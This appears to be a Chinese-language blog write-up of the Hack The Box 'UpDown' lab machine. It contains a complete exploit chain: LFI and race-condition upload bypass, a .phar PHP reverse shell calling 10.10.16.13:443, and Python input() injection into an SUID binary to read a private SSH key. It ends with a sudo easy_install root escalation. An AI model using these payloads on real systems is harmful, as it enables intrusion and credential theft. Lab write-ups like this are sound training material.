+<h3 id="index-php路由分析"><a href="#index-php路由分析" class="headerlink" title="index.php路由分析"></a>index.php路由分析</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$page</span> &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|usr|home|var|etc/i&quot;</span>,<span class="variable">$page</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;checker.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>漏洞分析：</strong></p>
+<ul>
+<li><strong>LFI漏洞：</strong> 直接包含用户输入的文件</li>
+<li><strong>过滤绕过：</strong> 正则只过滤特定目录名，可用<code>../</code>绕过</li>
+<li><strong>文件扩展名：</strong> 自动添加<code>.php</code>后缀，限制了文件类型</li>
+</ul>
+<h3 id="checker-php文件上传分析"><a href="#checker-php文件上传分析" class="headerlink" title="checker.php文件上传分析"></a>checker.php文件上传分析</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件大小检查</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;File too large!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 危险扩展名过滤</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&quot;</span>,<span class="variable">$ext</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Extension not allowed!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件上传到临时目录</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>()).<span class="string">&quot;/&quot;</span>;</span><br><span class="line"><span class="variable">$final_path</span> = <span class="variable">$dir</span>.<span class="variable">$file</span>;</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;<span class="subst">&#123;$final_path&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理后删除文件</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$final_path</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>漏洞点：</strong></p>
+<ul>
+<li><strong>扩展名绕过：</strong> <code>.phar</code>扩展名未被过滤，但PHP仍可执行</li>
+<li><strong>竞态条件：</strong> 文件上传后到删除前存在时间窗口</li>
+<li><strong>目录可预测：</strong> 使用<code>md5(time())</code>生成目录名，时间可预测</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="竞态条件-文件上传RCE"><a href="#竞态条件-文件上传RCE" class="headerlink" title="竞态条件+文件上传RCE"></a>竞态条件+文件上传RCE</h3><h4 id="1-构造恶意-phar文件"><a href="#1-构造恶意-phar文件" class="headerlink" title="1. 构造恶意.phar文件"></a>1. 构造恶意.phar文件</h4><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; shell.phar &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">http://httpbin.org/delay/5</span><br><span class="line">http://www.google.com</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$descriptorspec</span> = array(</span><br><span class="line">    0 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),</span><br><span class="line">    1 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>), </span><br><span class="line">    2 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.13/443 0&gt;&amp;1&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$proc</span> = proc_open(<span class="variable">$cmd</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line">?&gt;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>技术说明：</strong></p>
+<ul>
+<li><strong>文件伪装：</strong> 前两行是正常URL，绕过内容检测</li>
+<li><strong>反向Shell：</strong> 使用<code>proc_open</code>执行bash反向连接</li>
+<li><strong>重定向机制：</strong> <code>&gt;&amp;</code> 将标准输出和错误都重定向到网络连接</li>
+</ul>
+<h4 id="2-启动监听器"><a href="#2-启动监听器" class="headerlink" title="2. 启动监听器"></a>2. 启动监听器</h4><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 443</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>参数解析：</strong></p>
+<ul>
+<li><code>-n</code>: 不进行DNS解析，提高连接速度</li>
+<li><code>-l</code>: 监听模式</li>
+<li><code>-v</code>: 详细输出</li>
+<li><code>-p 443</code>: 监听443端口</li>
+</ul>
+<h4 id="3-利用时序窗口"><a href="#3-利用时序窗口" class="headerlink" title="3. 利用时序窗口"></a>3. 利用时序窗口</h4><p><strong>攻击流程：</strong></p>
+<ol>
+<li>上传shell.phar到 <code>http://dev.siteisup.htb/?page=checker</code></li>
+<li>添加绕过头部: <code>Special-Dev: only4dev</code></li>
+<li>利用checker.php处理URL的延时（httpbin.org&#x2F;delay&#x2F;5）</li>
+<li>在文件被unlink删除前访问执行</li>
+</ol>
+<p><strong>时间窗口原理：</strong></p>
+<ul>
+<li>checker.php先保存文件，再处理URL内容</li>
+<li>处理延时URL时，文件仍存在服务器上</li>
+<li>此时通过LFI包含上传的文件即可执行PHP代码</li>
+</ul>
+<h4 id="4-获得初始Shell"><a href="#4-获得初始Shell" class="headerlink" title="4. 获得初始Shell"></a>4. 获得初始Shell</h4><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@updown:/var/www/dev/uploads/ba1525b4df3af4568bdb8ad883e9adac$</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="权限提升1-www-data-→-developer"><a href="#权限提升1-www-data-→-developer" class="headerlink" title="权限提升1: www-data → developer"></a>权限提升1: www-data → developer</h2><h3 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span>  <span class="comment"># www-data</span></span><br><span class="line"><span class="built_in">id</span>      <span class="comment"># uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line">find / -name <span class="string">&quot;user.txt&quot;</span> 2&gt;/dev/null  <span class="comment"># /home/developer/user.txt</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="SUID程序发现"><a href="#SUID程序发现" class="headerlink" title="SUID程序发现"></a>SUID程序发现</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null | grep -v <span class="string">&#x27;/usr\|/bin&#x27;</span></span><br><span class="line"><span class="built_in">ls</span> -la /home/developer/dev/</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>关键发现：</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-x--- 1 developer www-data  16928 Jun 22  2022 siteisup</span><br><span class="line">-rwxr-x--- 1 developer www-data    154 Jun 22  2022 siteisup_test.py</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>SUID权限分析：</strong></p>
+<ul>
+<li><code>s</code>位表示SUID权限，执行时以文件所有者权限运行</li>
+<li>文件所有者是developer，www-data组可执行</li>
+<li>执行时将获得developer用户权限</li>
+</ul>
+<h3 id="程序逆向分析"><a href="#程序逆向分析" class="headerlink" title="程序逆向分析"></a>程序逆向分析</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings siteisup</span><br><span class="line">file siteisup  <span class="comment"># ELF 64-bit LSB executable</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>关键字符串发现：</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python /home/developer/dev/siteisup_test.py</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>程序工作原理：</strong></p>
+<ul>
+<li>C程序调用Python脚本处理用户输入</li>
+<li>用户输入传递给Python脚本的URL验证函数</li>
+<li>Python的input()函数可被代码注入</li>
+</ul>
+<h3 id="Python代码注入利用"><a href="#Python代码注入利用" class="headerlink" title="Python代码注入利用"></a>Python代码注入利用</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./siteisup</span><br><span class="line">Welcome to <span class="string">&#x27;siteisup.htb&#x27;</span> application</span><br><span class="line">Enter URL here: __import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;bash&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>注入原理：</strong></p>
+<ul>
+<li>Python的<code>input()</code>函数在某些情况下可执行Python代码</li>
+<li><code>__import__(&#39;os&#39;).system(&#39;bash&#39;)</code>动态导入os模块并执行系统命令</li>
+<li>由于SUID权限，bash以developer权限启动</li>
+</ul>
+<p><strong>成功提权：</strong> <code>developer@updown:/home/developer/dev$</code></p>
+<h3 id="获取稳定SSH访问"><a href="#获取稳定SSH访问" class="headerlink" title="获取稳定SSH访问"></a>获取稳定SSH访问</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./siteisup</span><br><span class="line">Enter URL here: __import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat /home/developer/.ssh/id_rsa&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>保存并使用私钥：</strong></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地保存私钥</span></span><br><span class="line">vim developer_id_rsa</span><br><span class="line"><span class="built_in">chmod</span> 600 developer_id_rsa</span><br><span class="line">ssh -i developer_id_rsa developer@10.129.128.145</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="权限提升2-developer-→-root"><a href="#权限提升2-developer-→-root" class="headerlink" title="权限提升2: developer → root"></a>权限提升2: developer → root</h2><h3 id="Sudo权限检查"><a href="#Sudo权限检查" class="headerlink" title="Sudo权限检查"></a>Sudo权限检查</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>输出分析：</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User developer may run the following commands on localhost:</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/easy_install</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>(ALL)</code>: 可以以任何用户身份执行</li>
+<li><code>NOPASSWD</code>: 无需输入密码</li>
+<li><code>/usr/local/bin/easy_install</code>: 可执行的具体程序</li>
+</ul>
+<h3 id="GTFOBins技术利用"><a href="#GTFOBins技术利用" class="headerlink" title="GTFOBins技术利用"></a>GTFOBins技术利用</h3><p><strong>GTFOBins原理：</strong></p>
+<ul>
+<li>GTFOBins是Unix二进制程序的权限提升技术集合</li>
+<li>利用程序的设计功能实现意外的权限提升</li>
+<li>easy_install可以执行setup.py中的任意Python代码</li>
+</ul>
+<h4 id="easy-install提权利用"><a href="#easy-install提权利用" class="headerlink" title="easy_install提权利用"></a>easy_install提权利用</h4><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line"><span class="built_in">sudo</span> /usr/local/bin/easy_install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>技术解析：</strong></p>
+<ul>
+<li><code>mktemp -d</code>: 创建临时目录</li>
+<li><code>os.execl()</code>: 替换当前进程执行新程序</li>
+<li><code>sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)</code>: 将shell的输入输出重定向到当前终端</li>
+<li>easy_install执行setup.py时会以root权限运行Python代码</li>
+</ul>
+<p><strong>成功获得root：</strong> <code>root@updown:/tmp/tmp.6bPxETrQln#</code></p>
+<h3 id="Shell稳定化"><a href="#Shell稳定化" class="headerlink" title="Shell稳定化"></a>Shell稳定化</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="获取Flag"><a href="#获取Flag" class="headerlink" title="获取Flag"></a>获取Flag</h2><h3 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/developer/user.txt</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="关键技术总结"><a href="#关键技术总结" class="headerlink" title="关键技术总结"></a>关键技术总结</h2><p><strong>信息收集技术：</strong></p>
+<ul>
+<li>Nmap端口扫描和服务识别</li>
+<li>子域名枚举技术（Host头爆破）</li>
+<li>Git仓库暴露利用</li>
+</ul>
+<p><strong>Web应用攻击：</strong></p>
+<ul>
+<li>HTTP头部绕过访问控制</li>
+<li>竞态条件攻击</li>
+<li>文件上传绕过技术</li>
+<li>本地文件包含(LFI)利用</li>
+</ul>
+<p><strong>权限提升技术：</strong></p>
+<ul>
+<li>SUID程序分析和利用</li>
+<li>Python代码注入攻击</li>
+<li>GTFOBins二进制利用技术</li>
+<li>Sudo权限滥用</li>
+</ul>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> UpDown</li>
+        <li><strong>作者:</strong> Maxim Devere</li>
+        <li><strong>创建于
+                :</strong> 2025-05-24 12:45:01</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-05-24 12:49:51
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://maximdevere.github.io/2025/05/24/UpDown/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Hackthebox/">#Hackthebox</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Linux-Boxes/">#Linux Boxes</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/05/22/Busqueda/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Busqueda</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">UpDown</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#UpDown-HTB-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0"><span class="nav-text">UpDown HTB 渗透测试笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B4%E4%BD%93%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="nav-text">整体渗透思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BF%AB%E9%80%9F%E7%AB%AF%E5%8F%A3%E5%8F%91%E7%8E%B0"><span class="nav-text">快速端口发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB"><span class="nav-text">详细服务识别</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%90%8D%E5%8F%91%E7%8E%B0"><span class="nav-text">域名发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-text">目录暴力破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="nav-text">子域名枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Git%E4%BB%93%E5%BA%93%E5%8F%91%E7%8E%B0"><span class="nav-text">Git仓库发现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Git%E4%BB%93%E5%BA%93%E5%88%A9%E7%94%A8"><span class="nav-text">Git仓库利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Git%E4%BB%93%E5%BA%93%E8%BD%AC%E5%82%A8"><span class="nav-text">Git仓库转储</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="nav-text">源码文件结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">源代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#htaccess%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%86%E6%9E%90"><span class="nav-text">.htaccess访问控制分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#index-php%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="nav-text">index.php路由分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#checker-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90"><span class="nav-text">checker.php文件上传分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE"><span class="nav-text">竞态条件+文件上传RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%871-www-data-%E2%86%92-developer"><span class="nav-text">权限提升1: www-data → developer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">系统信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUID%E7%A8%8B%E5%BA%8F%E5%8F%91%E7%8E%B0"><span class="nav-text">SUID程序发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-text">程序逆向分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="nav-text">Python代码注入利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%A8%B3%E5%AE%9ASSH%E8%AE%BF%E9%97%AE"><span class="nav-text">获取稳定SSH访问</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%872-developer-%E2%86%92-root"><span class="nav-text">权限提升2: developer → root</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sudo%E6%9D%83%E9%99%90%E6%A3%80%E6%9F%A5"><span class="nav-text">Sudo权限检查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GTFOBins%E6%8A%80%E6%9C%AF%E5%88%A9%E7%94%A8"><span class="nav-text">GTFOBins技术利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shell%E7%A8%B3%E5%AE%9A%E5%8C%96"><span class="nav-text">Shell稳定化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96Flag"><span class="nav-text">获取Flag</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#User-Flag"><span class="nav-text">User Flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Root-Flag"><span class="nav-text">Root Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93"><span class="nav-text">关键技术总结</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-face-sad-tear" style="color: #808080"></i>&nbsp;&nbsp;<a href="/">Maxim Devere</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 3 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+                
+
+                    
+                        <script data-swup-reload-script src="/js/interactive.js"></script>
+                    
+        
+                
+
+                    
+                        <script data-swup-reload-script src="/js/cards.js"></script>
+                    
+        
+                
+
+                    
+                        <script data-swup-reload-script src="/js/text-effects.js"></script>
+                    
+        
+                
+
+                    
+                        <script data-swup-reload-script src="/js/parallax.js"></script>
+                    
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
